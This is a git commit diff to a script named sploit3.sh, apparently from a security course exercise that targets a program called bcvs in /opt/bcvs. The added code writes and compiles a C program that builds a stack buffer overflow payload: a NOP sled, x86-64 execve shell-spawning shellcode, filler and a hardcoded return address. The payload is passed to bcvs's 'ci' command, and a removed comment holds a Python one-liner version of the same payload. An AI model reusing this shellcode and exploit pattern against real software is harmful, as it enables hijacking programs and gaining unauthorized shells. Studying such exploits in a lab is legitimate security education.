ae6287a71e37598940d7a7b08da4f4bc08059d5e
Alex Biedny <abiedny09@gmail.com>
2020-10-23 12:57:56 -0500

    sploit3 scripted

--- sploit3.sh
+++ sploit3.sh
@@ -1,4 +1,39 @@
 #unique since it's a buffer overflow and I use this nowhere else
-# 290 filler + 8 ret addr
-# 200 NOP + 27 shellcode + 63 filler + 8 ret addr
-#./bcvs ci $(python -c 'print("\x90"*200 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "A"*63 + "\xf0\xe7\xff\xff\xff\x7f\x00\x00")')
+cd /opt/bcvs
+touch buff2.c
+cat <<EOS > "buff2.c"
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define NOP 0x90
+
+char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+char addr[] = "\x50\xe6\xff\xff\xff\x7f";
+
+void main() {
+    char buff[533] = {0};
+
+    // 263 NOP sled
+    for (int i = 0; i < 263; i++) {
+        buff[i] = NOP;
+    }
+    // 27 shellcode
+    for (int i = 0; i < 27; i++) {
+        buff[i+263] = shellcode[i];
+    }
+    // 236 filler
+    for (int i = 0; i < 236; i++) {
+        buff[i+290] = '\x41';
+    }
+    // 6 addr LSB
+    for (int i = 0; i < 6; i++) {
+        buff[i+526] = addr[i];
+    }
+    buff[532] = '\0';
+
+    printf(buff);
+}
+EOS
+gcc buff2.c
+./bcvs ci $(./a.out)
